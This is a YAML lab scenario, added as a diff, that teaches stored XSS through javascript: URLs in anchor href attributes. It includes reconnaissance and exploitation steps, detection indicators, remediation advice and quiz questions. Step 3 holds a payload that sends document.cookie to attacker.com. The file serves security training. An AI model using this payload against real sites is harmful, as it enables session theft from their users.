@@ -1,0 +1,91 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Stored XSS into anchor href attribute with double quotes HTML-encoded"
+id: "xss-stored-href-001"
+category: "xss"
+subcategory: "stored"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers stored XSS in an anchor tag's href attribute. The
+  input is stored and later used in an `<a href="USER_INPUT">` tag. Even if
+  double quotes are encoded, the attacker can use a `javascript:` URL to
+  execute code when the link is clicked.
+
+learning_objectives:
+  - Understand how href attributes can be exploited
+  - Use `javascript:` URLs to execute code
+  - Bypass quote encoding if `javascript:` does not need quotes
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Basic understanding of HTML links
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify stored input that becomes an href attribute"
+    commands:
+      - "# Look for fields like 'website', 'profile URL'"
+      - "# Submit a test URL and see if it appears in href"
+    expected_output: "Input is reflected as href value"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject a javascript: URL"
+    commands:
+      - "# Payload: javascript:alert('XSS')"
+      - "# Submit and then click the link"
+    expected_output: "JavaScript alert executes"
+    detection: "Web application logs may show stored payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Use javascript: to steal data"
+    commands:
+      - "# Payload: javascript:document.location='http://attacker.com/steal?cookie='+document.cookie"
+    expected_output: "Cookie exfiltrated"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Stored data with javascript: scheme"
+  log_indicators:
+    - "Web server logs with unusual data"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Validate URLs and only allow http/https protocols"
+    - "Use a whitelist of allowed schemes"
+  long_term:
+    - "Sanitize input with a library that removes javascript:"
+    - "Implement CSP to block unsafe-inline"
+
+variables:
+  target_url: "http://example.com/profile?website=PAYLOAD"
+
+assessment_questions:
+  - "What is a javascript: URL and how is it exploited?"
+  - "How can you validate URLs to prevent this?"
+  - "What is the difference between href and src attributes in terms of risk?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+    title: "XSS Filter Evasion"
